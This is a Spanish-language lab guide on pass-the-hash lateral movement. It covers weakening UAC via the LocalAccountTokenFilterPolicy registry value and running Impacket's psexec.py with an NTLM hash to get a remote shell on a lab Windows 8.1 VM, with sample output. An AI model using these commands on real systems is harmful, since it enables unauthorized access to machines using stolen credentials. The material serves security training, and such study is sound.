# Práctica de Laboratorio: Movimiento Lateral con Pass-the-Hash (PtH)

**Objetivo:** Utilizar un hash NTLM previamente obtenido para autenticarse en una máquina Windows y obtener una shell remota, sin necesidad de conocer la contraseña en texto plano.

**Escenario:** Este es un ataque de **post-explotación**. El escenario asume que ya has comprometido una máquina y, usando una herramienta como Mimikatz, has extraído el hash NTLM de un usuario. Para este laboratorio, generaremos el hash nosotros mismos para simular que ya lo hemos "robado".

**Máquinas y Servicios Requeridos:**
*   Una VM con Kali Linux (atacante).
*   Una VM con Windows 8.1 (víctima).

**Herramientas:**
*   `impacket-psexec` (parte de la suite Impacket en Kali).

---

## Parte 1: Preparación del Entorno

### Paso 1: Instalar Impacket en Kali

Impacket es una colección de clases de Python para trabajar con protocolos de red. Es fundamental para el pentesting en entornos Windows. Asegúrate de que esté instalada.

```bash
sudo apt-get update
sudo apt-get install python3-impacket
```

### Paso 2: Obtener el Hash NTLM (Simulación)

En un ataque real, obtendrías este hash de la memoria de un sistema comprometido con Mimikatz. Para nuestro laboratorio, vamos a obtener el hash de una cuenta de nuestra propia máquina Windows.

1.  **En la VM de Windows 8.1**, abre un símbolo del sistema (cmd) **como Administrador**.
2.  Windows no almacena los hashes en un formato directamente accesible. Necesitaríamos herramientas de terceros. Para simplificar, **vamos a asumir que hemos extraído el hash NTLM de un usuario**. 

    Por ejemplo, supongamos que el usuario es `m1txel` y su hash NTLM robado es `AAD3B435B51404EEAAD3B435B51404EE`. (Este es un hash vacío, solo para el ejemplo).

    > **Importante:** Para que el ataque funcione, el usuario cuyo hash has robado debe tener permisos de administrador en la máquina destino. En nuestro caso, usaremos el hash de una cuenta que sea administradora en la propia VM de Windows 8.1.

### Paso 3: Desactivar UAC para Sesiones Remotas (Necesario en Windows Modernos)

Por defecto, User Account Control (UAC) en Windows previene que las cuentas locales (que no sean el usuario `Administrator` integrado) realicen tareas administrativas de forma remota, incluso si son del grupo de administradores. Para que PtH funcione contra un usuario administrador que no sea "Administrator", debemos desactivar esta restricción.

1.  **En la VM de Windows 8.1**, abre `regedit`.
2.  Navega a la siguiente clave:
    `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
3.  Crea un nuevo valor `DWORD (32-bit)`.
4.  Nómbralo `LocalAccountTokenFilterPolicy`.
5.  Modifica su valor y ponlo en `1`.
6.  **Reinicia la máquina Windows** para que el cambio surta efecto.

---

## Parte 2: Ejecución del Ataque Pass-the-Hash desde Kali

Ahora que tenemos el usuario, el hash y la IP de la víctima, podemos lanzar el ataque.

Usaremos `psexec.py` de Impacket. Esta herramienta nos permite ejecutar comandos de forma remota y obtener una shell interactiva.

### Sintaxis del Comando

La sintaxis para Pass-the-Hash con `psexec.py` es:

`psexec.py [dominio]/[usuario]@[IP_VICTIMA] -hashes [LM_HASH]:[NTLM_HASH]`

*   Como es una cuenta local, no especificamos dominio.
*   El hash LM es un formato antiguo y a menudo está vacío. Lo representamos como `AAD3B435B51404EEAAD3B435B51404EE`.

### Ejecución

Reemplaza los valores con los de tu laboratorio.

```bash
# Sintaxis: psexec.py <usuario>@<IP_VICTIMA> -hashes <LM_HASH>:<NTLM_HASH>
# Ejemplo:
psexec.py m1txel@[IP_DE_TU_WINDOWS_8.1] -hashes AAD3B435B51404EEAAD3B435B51404EE:5d2e1b8762181a8a5183a69a33554f59
```

> **Nota:** Deberás reemplazar `5d2e1b8762181a8a5183a69a33554f59` por el hash NTLM real de la cuenta de administrador de tu Windows 8.1. Una forma de obtenerlo en un entorno de laboratorio es cambiar la contraseña del usuario a algo conocido (ej: "Password123"), y luego usar un generador online de hashes NTLM para obtener el hash correspondiente a esa contraseña.

**Resultado:**

Si el ataque tiene éxito, Impacket se autenticará en la máquina Windows, subirá un servicio temporal y te presentará una shell interactiva del sistema víctima:

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on [IP_VICTIMA].....
[*] Found writable share ADMIN$
[*] Uploading file ...
[*] Opening SVCManager on [IP_VICTIMA].....
[*] Creating service ...
[*] Starting service ...
[*] Removing service ...
[*] Closing SVCManager
[*] Sending file ...
[*] Dropping ADMIN$ share

C:\Windows\system32> 
```

¡Felicidades! Ahora tienes una shell `cmd.exe` en la máquina víctima con los privilegios del usuario cuyo hash robaste, y nunca necesitaste saber su contraseña.

Para salir, simplemente escribe `exit`.